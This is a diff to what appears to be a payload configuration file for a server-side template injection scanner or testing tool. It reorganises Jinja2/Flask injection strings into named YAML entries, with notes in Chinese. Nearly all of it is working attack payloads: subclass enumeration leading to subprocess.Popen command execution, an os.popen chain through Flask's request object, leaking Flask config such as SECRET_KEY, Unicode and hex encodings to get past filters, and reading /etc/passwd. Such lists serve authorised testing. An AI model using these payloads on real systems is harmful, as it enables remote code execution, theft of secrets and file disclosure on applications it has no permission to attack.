@@ -31,27 +31,34 @@ detection:
 
 payloads:
   basic_rce:
-    - "{{''.__class__.__mro__[1].__subclasses__()}}"
+    - basic_rce: >
+        {{''.__class__.__mro__[1].__subclasses__()}}
       note: "列出所有子类，定位 subprocess.Popen 索引 X"
-    - "{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}"
+    - basic_rce_exec: >
+        {{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
       note: "X 替换为 subprocess.Popen 的实际索引"
 
   flask_specific:
-    - "{{config.items()}}"
+    - config_items: "{{config.items()}}"
       note: "泄露 Flask 配置（SECRET_KEY 等）"
-    - "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['os'].popen('id').read()}}"
+    - flask_object_chain: >
+        {{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['os'].popen('id').read()}}
       note: "通过 Flask request 对象链执行命令"
 
   unicode_bypass:
-    - "{{lipsum|attr('\u005f\u005fglobals\u005f\u005f')}}"
+    - unicode_globals: >
+        {{lipsum|attr('\u005f\u005fglobals\u005f\u005f')}}
       note: "Unicode 编码绕过 . 和 __ 过滤"
-    - "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}"
+    - hex_globals: >
+        {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
       note: "十六进制编码绕过"
 
   sandbox_escape:
-    - "{{''.__class__.__bases__[0].__subclasses__()}}"
+    - subclasses: >
+        {{''.__class__.__bases__[0].__subclasses__()}}
       note: "通过 __bases__ 替代 __mro__"
-    - "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}"
+    - file_read: >
+        {{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
       note: "通过 Flask 内置函数访问 builtins"
 
 success_indicators:
